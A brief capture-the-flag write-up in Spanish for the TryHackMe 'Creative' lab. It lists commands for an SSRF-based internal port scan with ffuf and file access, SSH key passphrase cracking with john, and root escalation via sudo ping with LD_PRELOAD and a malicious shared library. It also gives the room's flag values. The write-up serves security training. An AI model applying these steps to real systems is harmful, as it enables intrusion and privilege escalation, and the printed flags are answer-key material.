# TryHackMe - Creative — Writeup

## Resumen
- **Target:** 10.64.137.127
- **Vector:** SSRF + LD_PRELOAD sudo privesc
- **user.txt** → `9a1ce90a7653d74ab98630b47b8b4a84`
- **root.txt** → `992bfd94b90da48634aed182aae7b99f`

## Kill chain
1. **Recon:** nmap/rustscan → 22 (ssh), 80 (nginx). Vhost fuzz → `beta.creative.thm`.
2. **SSRF:** URL tester POST envía a Flask `requests.get(url)`; status 200 → renders body.
3. **Internal port scan:** `ffuf -d 'url=http://127.0.0.1:FUZZ/' -fs 13` → port **1337** (Python `SimpleHTTPRequestHandler` corriendo como saad).
4. **LFI via SSRF:** explorar `127.0.0.1:1337/` → directory listing del FS; `id_rsa` y `user.txt` de saad; badr.rules.yaml sugiere `/home/creative/user.txt` y `/root/root.txt`.
5. **Crack passphrase** SSH key: `ssh2john` (parche Py3) + `john --wordlist=rockyou` → `sweetness`.
6. **SSH saad:** `ssh -i id_rsa_dec saad@10.64.137.127` (post `ssh-keygen -p -P sweetness -N ""`).
7. **Privesc:** `sudo -l` → `(root) /usr/bin/ping` con `env_keep+=LD_PRELOAD`. Compilar `shell.c` con `_init()` que setea uid/gid 0 y dumpea `/root/root.txt`. `sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping` → root.

## Flags
- user.txt: `9a1ce90a7653d74ab98630b47b8b4a84`
- root.txt: `992bfd94b90da48634aed182aae7b99f`

